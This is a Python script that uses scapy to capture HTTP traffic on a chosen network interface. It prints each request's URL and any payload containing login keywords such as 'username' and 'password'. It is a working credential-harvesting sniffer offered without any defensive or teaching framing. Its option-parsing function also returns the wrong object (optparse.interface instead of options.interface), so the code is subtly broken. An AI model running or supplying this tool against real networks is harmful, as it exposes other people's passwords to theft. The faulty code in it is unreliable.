from optparse import OptionParser
import scapy.all as scapy
from scapy.layers import http

# Getting CLI 
def get_options():
    optparse = OptionParser()
    optparse.add_option( "-i" , "--interface" , dest = "interface" , help="Used to specify wireless adapter interface !")
    options  = optparse.parse_args()[0]
    if not options.interface:
        optparse.error("Please specify the interface !")
    else:
        return optparse.interface
    
# Getting Sniffing Packets
def sniff(interface):
    scapy.sniff(iface=interface, store=False , prn=print_sniffed_packets ) 
# Getting Packet URL which Has Creds
def get_url(packet):
    url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
    return url
# Filtering Packets for Credetials 
def get_credential(packet):
    if packet.haslayer(scapy.Raw):
            load = str(packet[scapy.Raw].load)
            keywords = ["email" , "username" , "password" , "login" , "user" ]
            for key in keywords:
                if key in load:
                    return load
# Displaying Sniffed Packets
def print_sniffed_packets(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("link >>> ",url)
        cred = get_credential(packet)
        if cred:
            print("cred >>> ",cred)

interface = get_options()
sniff(interface)
